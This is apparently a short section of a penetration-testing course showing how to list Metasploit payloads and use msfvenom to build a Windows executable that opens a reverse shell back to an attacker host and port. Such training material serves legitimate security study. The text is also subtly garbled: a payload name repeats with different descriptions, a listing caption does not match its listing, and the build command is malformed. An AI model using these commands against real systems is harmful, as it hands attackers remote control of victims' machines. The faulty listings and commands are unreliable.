# 20.2.3 Executable Payloads

Metasploit provides the functionality to export payloads into various file types and formats such as Windows and Linux binaries, webshells, and more. Metasploit contains msfvenom as a standalone to generate these payloads. It provides standardized command line options and includes various techniques to customize payloads.

To get familiar with msfvenom, we will first create a malicious Windows binary starting a TCP reverse shell. Let's be begin by listing all payloads with payloads as argument -l. In addition, we use --platform to specify the platform and -arch for the architecture.

```
kali@~$ msfvenom -l payloads --platform windows --arch x64
```

```
windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64)
(staged). Connect back to the attacker (Windows x64)
...
windows/x64/shell/reverse_tcp               Connect back to attacker and spawn a
command shell (Windows x64)
```

> Listing 662 - Creating an executable with a reverse shell payload

Listing 662 shows that we can choose between a staged and non-staged payload. For example, we'll use the non-staged payload first.

Now, let's use the -p to set the payload, LHOST and LPORT to assign the host and port for the reverse connection, -f to set the output format (exe in this case), and -o to specify the output name:

```
kali@~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.22 LPORT=443 -f exe -nonstaged.exe
[-] No payload was selected, choosing Msf:Module:Windows from the payload
[-] No arch selected, selecting: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe: 7168 bytes
Saved as: nonstaged.exe
```

> Listing 663 - Creating an executable with a nonstaged tcp reverse shell payload
